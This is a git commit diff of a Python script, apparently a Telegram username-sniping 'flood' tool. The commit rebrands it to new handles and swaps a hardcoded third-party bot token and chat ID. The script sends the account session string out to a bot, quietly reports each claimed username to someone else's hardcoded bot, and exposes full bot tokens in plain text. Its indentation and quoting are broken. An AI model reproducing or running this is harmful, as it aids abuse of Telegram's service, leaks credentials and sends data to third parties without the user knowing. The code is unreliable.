4073baa020ac0ba584ee805ab5000e68276911ef
v7ja <142932805+v7ja@users.noreply.github.com>
2024-02-28 20:15:22 +0300

    Update rode1.py

--- rode1.py
+++ rode1.py
@@ -21,17 +21,17 @@ while True:
 						photo_path = "https://telegra.ph/file/bff1264778391cdd1635a.mp4"
 new_photo = app.upload_document(photo_path)
      app.set_profile_photo(new_photo)
-						app.update_profile(first_name="- ძ᥆ᥒ𝖾 α𝖻᥆᥆ძ | #1", bio="𝖼𝗁 , @ToGoLang | 𝖽𝖾𝗏 , @c_7c7")
+						app.update_profile(first_name="𝖢𝗅𝗂𝗆𝖾 𝖣𝗈𝗇𝖾 #1iraq", bio="𝖼𝗁 , @fakeShe | 𝖽𝖾𝗏 , @Howend")
 						qq+=1
 						op = requests.post(f'''https://api.telegram.org/bot{tok}/sendvideo?chat_id={idown}&video=https://telegra.ph/file/bff1264778391cdd1635a.mp4&caption=> 
 					new   FLOOD
-is a new Flood By : aBooD 🐊,
+is a new Flood By : Howend 🐊,
 এ〔 𝗎𝗌𝖾𝗋𝗇𝖺𝗆𝖾 〕: @{o}
 এ〔 𝖼𝗅𝗂𝖼𝗄𝗌 〕: {qq}
-এ〔 𝖼𝗁 〕: @ToGoLang
+এ〔 𝖼𝗁 〕: @fakeShe
 এ〔 𝗍𝗒𝗉𝖾 〕: 𝖺𝖼𝖼𝗈𝗎𝗇𝗍''')''')
 						v = requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={idown}&text=[ {session} ]')
-						pl = requests.post(f'''https://api.telegram.org/bot6454343075:AAG3HpOLUhQWBisOMwIfGuP9Q2DPaKqbz4A/sendvideo?chat_id=94784270&video=https://telegra.ph/file/3a3fc7aa1b03a4a48c11e.mp4&caption=> Sorry Bot I'm Top 1\nnew   FLOOD\n UserName: @{o}\n  Clicks: {qq}\n Type: Account\n  BY : @ToGoLang ↬ @c_7c7 , 🐊''')
+						pl = requests.post(f'''https://api.telegram.org/bot6938505054:AAEEC3zjG1bVgZ7R2B4-W0s7dXAE9uoBQBo/sendvideo?chat_id=6781247348&video=https://telegra.ph/file/3a3fc7aa1b03a4a48c11e.mp4&caption=> Sorry Bot I'm Top 1\nnew   FLOOD\n UserName: @{o}\n  Clicks: {qq}\n Type: Account\n  BY : @fakeshe ↬ @Howend , 🐊''')
 						os.system('screen -S rode1.py -X kill')
 					except FloodWait as e:
 						qq+=1
